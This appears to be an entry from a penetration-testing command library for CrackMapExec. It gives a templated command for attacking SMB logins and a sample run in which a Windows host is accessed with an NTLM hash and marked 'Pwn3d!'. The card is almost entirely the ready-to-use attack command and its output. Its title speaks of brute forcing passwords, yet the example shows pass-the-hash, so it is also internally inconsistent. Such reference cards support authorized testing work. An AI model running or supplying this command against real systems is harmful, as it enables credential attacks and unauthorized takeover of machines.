---
id: 4fc0ee9c-a0b1-4198-9099-1184c8b25805
name: CrackMapExec Brute Force SMB Usernames and Passwords
type: command
executor: bash
data: crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD
output: 'root@kali:~/Documents# crackmapexec smb 10.10.10.10 -u Bob -H 6608e4bc7b2b7a5f77ce3573570775af

  [*] First time use detected

  [*] Creating home directory structure

  [*] Initializing the database

  [*] Copying default configuration file

  [*] Generating SSL certificate

  CME          10.10.10.10:445 BOB-PC [*] Windows 10.0 Build 18362 (name:BOB-PC) (domain:BOB-PC)

  CME          10.10.10.10:445 BOB-PC [+] BOB-PC\Victim 6608e4bc7b2b7a5f77ce3573570775af
  (Pwn3d!)

  [*] KTHXBYE!'
created_at: '2019-10-01T17:58:48.950278+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[CrackMapExec]]'
---

# CrackMapExec Brute Force SMB Usernames and Passwords

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD
```

## Expected Output

```
root@kali:~/Documents# crackmapexec smb 10.10.10.10 -u Bob -H 6608e4bc7b2b7a5f77ce3573570775af
[*] First time use detected
[*] Creating home directory structure
[*] Initializing the database
[*] Copying default configuration file
[*] Generating SSL certificate
CME          10.10.10.10:445 BOB-PC [*] Windows 10.0 Build 18362 (name:BOB-PC) (domain:BOB-PC)
CME          10.10.10.10:445 BOB-PC [+] BOB-PC\Victim 6608e4bc7b2b7a5f77ce3573570775af (Pwn3d!)
[*] KTHXBYE!
```


